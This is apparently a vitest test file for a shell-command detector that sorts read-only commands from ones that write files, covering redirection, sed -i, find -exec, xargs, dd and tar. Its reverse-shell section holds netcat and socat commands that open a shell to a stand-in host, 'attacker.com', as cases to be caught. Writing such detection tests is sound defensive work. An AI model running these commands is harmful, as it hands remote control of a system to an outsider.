import { describe, it, expect } from "vitest";
import { WritePatternDetector } from "../../../src/readonly-checker/write-patterns/write-pattern-detector.js";

describe("WritePatternDetector", () => {
  const detector = new WritePatternDetector();

  describe("redirection detection", () => {
    it("should detect > stdout redirection", () => {
      expect(detector.detect("ls > file.txt")).toMatchObject({ ok: true });
      expect(detector.detect("cat file.txt > output.txt")).toMatchObject({ ok: true });
    });
    it("should detect >> append redirection", () => {
      expect(detector.detect("ls >> file.txt")).toMatchObject({ ok: true });
      expect(detector.detect("cat file.txt >> output.txt")).toMatchObject({ ok: true });
    });
    it("should detect 2> stderr redirection", () => {
      expect(detector.detect("ls 2> error.log")).toMatchObject({ ok: true });
      expect(detector.detect("cat file.txt 2>> errors.log")).toMatchObject({ ok: true });
    });
    it("should detect &> combined redirection", () => {
      expect(detector.detect("ls &> output.log")).toMatchObject({ ok: true });
    });
    it("should allow 2>/dev/null (not a write)", () => {
      expect(detector.detect("sudo cat /proc/net/ipt_stat_filter 2>/dev/null")).toMatchObject({ ok: false });
      expect(detector.detect("cat file.txt 2>/dev/null || echo missing")).toMatchObject({ ok: false });
      expect(detector.detect("ls 2>&1")).toMatchObject({ ok: false });
      expect(detector.detect("command 2>/dev/zero")).toMatchObject({ ok: false });
    });
  });

  describe("process substitution", () => {
    it("should detect >(write) process substitution", () => {
      expect(detector.detect("diff <(ls dir1) >(sort)")).toMatchObject({ ok: true });
      expect(detector.detect("diff <(ls dir1) >(sort > /tmp/out)")).toMatchObject({ ok: true });
    });
    it("should allow <(read) process substitution", () => {
      expect(detector.detect("diff <(ls dir1) <(ls dir2)")).toMatchObject({ ok: false });
    });
  });

  describe("here-string", () => {
    it("should detect <<< here-string", () => {
      expect(detector.detect("<<< echo hello")).toMatchObject({ ok: true });
      expect(detector.detect("command <<< data")).toMatchObject({ ok: true });
    });
  });

  describe("sed in-place", () => {
    it("should detect sed -i", () => {
      expect(detector.detect("sed -i 's/x/y/g' file.txt")).toMatchObject({ ok: true });
      expect(detector.detect("sed -ibak 's/x/y/g' file.txt")).toMatchObject({ ok: true });
    });
    it("should detect sed --in-place", () => {
      expect(detector.detect("sed --in-place 's/x/y/g' file.txt")).toMatchObject({ ok: true });
    });
    it("should detect sed -n w write", () => {
      expect(detector.detect('sed -n "w /tmp/test.txt" <<< "hello"')).toMatchObject({ ok: true });
      expect(detector.detect("sed -n 'w /tmp/out' file.txt")).toMatchObject({ ok: true });
    });
  });

  describe("find -exec", () => {
    it("should detect find -exec", () => {
      expect(detector.detect("find . -exec touch {} \\;")).toMatchObject({ ok: true });
      expect(detector.detect("find /tmp -exec rm {} \\;")).toMatchObject({ ok: true });
    });
    it("should detect find -execdir", () => {
      expect(detector.detect("find . -execdir rm {} \\;")).toMatchObject({ ok: true });
      expect(detector.detect("find . -execdir touch {} \\;")).toMatchObject({ ok: true });
    });
  });

  describe("xargs", () => {
    it("should block xargs with write commands", () => {
      expect(detector.detect("xargs touch")).toMatchObject({ ok: true });
      expect(detector.detect("find . | xargs rm")).toMatchObject({ ok: true });
      expect(detector.detect("find . | xargs mkdir")).toMatchObject({ ok: true });
      expect(detector.detect("find . | xargs rmdir")).toMatchObject({ ok: true });
      expect(detector.detect("find . | xargs chmod")).toMatchObject({ ok: true });
      expect(detector.detect("find . | xargs chown")).toMatchObject({ ok: true });
      expect(detector.detect("find . | xargs mv")).toMatchObject({ ok: true });
      expect(detector.detect("find . | xargs cp")).toMatchObject({ ok: true });
      expect(detector.detect("find . | xargs ln")).toMatchObject({ ok: true });
      expect(detector.detect("find . | xargs unlink")).toMatchObject({ ok: true });
      expect(detector.detect("find . | xargs dd")).toMatchObject({ ok: true });
      expect(detector.detect("find . | xargs tar")).toMatchObject({ ok: true });
      expect(detector.detect("find . | xargs sed")).toMatchObject({ ok: true });
      expect(detector.detect("find . | xargs perl")).toMatchObject({ ok: true });
      expect(detector.detect("find . | xargs python3")).toMatchObject({ ok: true });
      expect(detector.detect("find . | xargs bash")).toMatchObject({ ok: true });
      expect(detector.detect("find . | xargs sh")).toMatchObject({ ok: true });
      expect(detector.detect("find . | xargs find")).toMatchObject({ ok: true });
      expect(detector.detect("find . | xargs xargs")).toMatchObject({ ok: true });
    });
    it("should allow xargs with read-only commands", () => {
      expect(detector.detect("find /etc/cron* /var/spool/cron -type f | xargs cat")).toMatchObject({ ok: false });
      expect(detector.detect("find . | xargs head")).toMatchObject({ ok: false });
      expect(detector.detect("find . | xargs tail")).toMatchObject({ ok: false });
      expect(detector.detect("find . | xargs grep pattern")).toMatchObject({ ok: false });
      expect(detector.detect("find . | xargs wc")).toMatchObject({ ok: false });
      expect(detector.detect("find . | xargs file")).toMatchObject({ ok: false });
      expect(detector.detect("find . | xargs md5sum")).toMatchObject({ ok: false });
      expect(detector.detect("find . | xargs sha256sum")).toMatchObject({ ok: false });
      expect(detector.detect("find . | xargs stat")).toMatchObject({ ok: false });
      expect(detector.detect("find . | xargs du")).toMatchObject({ ok: false });
      expect(detector.detect("find . | xargs sort")).toMatchObject({ ok: false });
      expect(detector.detect("find . | xargs awk")).toMatchObject({ ok: false });
      expect(detector.detect("find . | xargs diff")).toMatchObject({ ok: false });
      expect(detector.detect("find . | xargs less")).toMatchObject({ ok: false });
      expect(detector.detect("find . | xargs more")).toMatchObject({ ok: false });
      expect(detector.detect("find . | xargs ps")).toMatchObject({ ok: false });
      expect(detector.detect("find . | xargs lsof")).toMatchObject({ ok: false });
      expect(detector.detect("find . | xargs strace")).toMatchObject({ ok: false });
      expect(detector.detect("find . | xargs tcpdump")).toMatchObject({ ok: false });
      expect(detector.detect("find . | xargs od")).toMatchObject({ ok: false });
      expect(detector.detect("find . | xargs xxd")).toMatchObject({ ok: false });
      expect(detector.detect("find . | xargs hexdump")).toMatchObject({ ok: false });
      expect(detector.detect("find . | xargs nmcli")).toMatchObject({ ok: false });
      expect(detector.detect("find . | xargs journalctl")).toMatchObject({ ok: false });
      expect(detector.detect("find . | xargs dmesg")).toMatchObject({ ok: false });
      expect(detector.detect("find . | xargs vmstat")).toMatchObject({ ok: false });
      expect(detector.detect("find . | xargs iostat")).toMatchObject({ ok: false });
      expect(detector.detect("find . | xargs lsblk")).toMatchObject({ ok: false });
      expect(detector.detect("find . | xargs lspci")).toMatchObject({ ok: false });
      expect(detector.detect("find . | xargs lsusb")).toMatchObject({ ok: false });
      expect(detector.detect("find . | xargs docker ps")).toMatchObject({ ok: false });
      expect(detector.detect("find . | xargs docker images")).toMatchObject({ ok: false });
      expect(detector.detect("find . | xargs docker inspect")).toMatchObject({ ok: false });
      expect(detector.detect("find . | xargs docker logs")).toMatchObject({ ok: false });
      expect(detector.detect("find . | xargs nc -vz host 80")).toMatchObject({ ok: false });
      expect(detector.detect("find . | xargs ping host")).toMatchObject({ ok: false });
      expect(detector.detect("find . | xargs dig domain.com")).toMatchObject({ ok: false });
      expect(detector.detect("find . | xargs whois domain.com")).toMatchObject({ ok: false });
      expect(detector.detect("find . | xargs ssh -G host")).toMatchObject({ ok: false });
      expect(detector.detect("find . | xargs ip addr")).toMatchObject({ ok: false });
      expect(detector.detect("find . | xargs ip route")).toMatchObject({ ok: false });
      expect(detector.detect("find . | xargs iptables -L")).toMatchObject({ ok: false });
      expect(detector.detect("find . | xargs firewall-cmd --list-all")).toMatchObject({ ok: false });
      expect(detector.detect("find . | xargs ufw status")).toMatchObject({ ok: false });
      expect(detector.detect("find . | xargs sestatus")).toMatchObject({ ok: false });
      expect(detector.detect("find . | xargs getenforce")).toMatchObject({ ok: false });
      expect(detector.detect("find . | xargs fail2ban-client status")).toMatchObject({ ok: false });
      expect(detector.detect("find . | xargs uptime")).toMatchObject({ ok: false });
      expect(detector.detect("find . | xargs who")).toMatchObject({ ok: false });
      expect(detector.detect("find . | xargs last")).toMatchObject({ ok: false });
      expect(detector.detect("find . | xargs lastlog")).toMatchObject({ ok: false });
      expect(detector.detect("find . | xargs rpm -q pkg")).toMatchObject({ ok: false });
      expect(detector.detect("find . | xargs dpkg -l pkg")).toMatchObject({ ok: false });
      expect(detector.detect("find . | xargs apt list")).toMatchObject({ ok: false });
      expect(detector.detect("find . | xargs yum list")).toMatchObject({ ok: false });
      expect(detector.detect("find . | xargs pip list")).toMatchObject({ ok: false });
      expect(detector.detect("find . | xargs npm ls")).toMatchObject({ ok: false });
      expect(detector.detect("find . | xargs curl -I url")).toMatchObject({ ok: false });
      expect(detector.detect("find . | xargs wget --spider url")).toMatchObject({ ok: false });
      expect(detector.detect("find . | xargs nmap --script host")).toMatchObject({ ok: false });
      expect(detector.detect("find . | xargs masscan host")).toMatchObject({ ok: false });
      expect(detector.detect("find . | xargs traceroute host")).toMatchObject({ ok: false });
      expect(detector.detect("find . | xargs mtr host")).toMatchObject({ ok: false });
      expect(detector.detect("find . | xargs nslookup host")).toMatchObject({ ok: false });
      expect(detector.detect("find . | xargs host domain")).toMatchObject({ ok: false });
      expect(detector.detect("find . | xargs ethtool eth0")).toMatchObject({ ok: false });
      expect(detector.detect("find . | xargs ifconfig")).toMatchObject({ ok: false });
      expect(detector.detect("find . | xargs netstat")).toMatchObject({ ok: false });
      expect(detector.detect("find . | xargs ss")).toMatchObject({ ok: false });
      expect(detector.detect("find . | xargs route")).toMatchObject({ ok: false });
      expect(detector.detect("find . | xargs arp")).toMatchObject({ ok: false });
      expect(detector.detect("find . | xargs iwconfig")).toMatchObject({ ok: false });
      expect(detector.detect("find . | xargs mii-tool")).toMatchObject({ ok: false });
      expect(detector.detect("find . | xargs hdparm -I dev")).toMatchObject({ ok: false });
      expect(detector.detect("find . | xargs smartctl -i dev")).toMatchObject({ ok: false });
      expect(detector.detect("find . | xargs lscpu")).toMatchObject({ ok: false });
      expect(detector.detect("find . | xargs lshw")).toMatchObject({ ok: false });
      expect(detector.detect("find . | xargs dmidecode")).toMatchObject({ ok: false });
      expect(detector.detect("find . | xargs inxi")).toMatchObject({ ok: false });
      expect(detector.detect("find . | xargs neofetch")).toMatchObject({ ok: false });
      expect(detector.detect("find . | xargs fastfetch")).toMatchObject({ ok: false });
      expect(detector.detect("find . | xargs mpstat")).toMatchObject({ ok: false });
      expect(detector.detect("find . | xargs sar")).toMatchObject({ ok: false });
      expect(detector.detect("find . | xargs numactl -H")).toMatchObject({ ok: false });
      expect(detector.detect("find . | xargs auditctl -l")).toMatchObject({ ok: false });
      expect(detector.detect("find . | xargs ausearch")).toMatchObject({ ok: false });
      expect(detector.detect("find . | xargs aureport")).toMatchObject({ ok: false });
      expect(detector.detect("find . | xargs logwatch")).toMatchObject({ ok: false });
      expect(detector.detect("find . | xargs logrotate -s")).toMatchObject({ ok: false });
    });
  });

  describe("cp stdin", () => {
    it("should detect cp with /dev/stdin", () => {
      expect(detector.detect("cp /dev/stdin /tmp/out")).toMatchObject({ ok: true });
    });
    it("should detect cp with -", () => {
      expect(detector.detect("cp -")).toMatchObject({ ok: true });
      expect(detector.detect("cat file | cp -")).toMatchObject({ ok: true });
    });
  });

  describe("dd output", () => {
    it("should detect dd of=", () => {
      expect(detector.detect("dd if=/dev/zero of=/tmp/test bs=1M")).toMatchObject({ ok: true });
      expect(detector.detect("dd of=/tmp/out if=/dev/zero bs=1M")).toMatchObject({ ok: true });
      expect(detector.detect("dd if=/dev/zero of=./file bs=1M")).toMatchObject({ ok: true });
      expect(detector.detect("dd if=/dev/zero of=../file bs=1M")).toMatchObject({ ok: true });
    });
  });

  describe("tar create", () => {
    it("should detect tar cf", () => {
      expect(detector.detect("tar cf archive.tar .")).toMatchObject({ ok: true });
      expect(detector.detect("tar czf archive.tar.gz dir/")).toMatchObject({ ok: true });
      expect(detector.detect("tar cJf archive.tar.xz dir/")).toMatchObject({ ok: true });
    });
    it("should detect tar --create", () => {
      expect(detector.detect("tar --create --file archive.tar .")).toMatchObject({ ok: true });
      expect(detector.detect("tar -c --file archive.tar .")).toMatchObject({ ok: true });
    });
  });

  describe("interpreter writes", () => {
    it("should detect python open() write", () => {
      expect(detector.detect("python3 -c 'open(\\'/tmp/x\\',\\'w\\')'")).toMatchObject({ ok: true });
    });
    it("should detect python os.system", () => {
      expect(detector.detect("python3 -c 'import os; os.system(\\'ls\\')'")).toMatchObject({ ok: true });
    });
    it("should detect python subprocess", () => {
      expect(detector.detect("python3 -c 'import subprocess; subprocess.run([\\'ls\\'])'")).toMatchObject({ ok: true });
    });
    it("should detect perl file write", () => {
      expect(detector.detect("perl -e 'open(F,\\'>/tmp/x\\'); print F \\\"hi\\\"'")).toMatchObject({ ok: true });
    });

  });

  describe("reverse shell detection", () => {
    it("should detect nc reverse shell", () => {
      expect(detector.detect("nc -e /bin/sh attacker.com 4444")).toMatchObject({ ok: true });
    });
    it("should detect socat reverse shell", () => {
      expect(detector.detect("socat exec:/bin/sh,pty tcp:attacker.com:4444")).toMatchObject({ ok: true });
    });
    it("should allow nc/socat read commands", () => {
      expect(detector.detect("nc -zv host 80")).toMatchObject({ ok: false });
      expect(detector.detect("socat TCP:host:80 -")).toMatchObject({ ok: false });
    });
  });

  describe("false positives", () => {
    it("should not false positive on bpftrace with open in name", () => {
      expect(detector.detect("bpftrace -e 'tracepoint:syscalls:sys_enter_open { printf(\\\"%s\\\", args->filename); }'")).toMatchObject({ ok: false });
    });
    it("should not false positive on systemtap with write in probe name", () => {
      expect(detector.detect("systemtap -e 'probe syscall.write { exit() }'")).toMatchObject({ ok: false });
    });
    it("should allow quoted > in strings", () => {
      expect(detector.detect('echo "data > file"')).toMatchObject({ ok: false });
      expect(detector.detect('grep ">" file.txt')).toMatchObject({ ok: false });
    });
  });
});
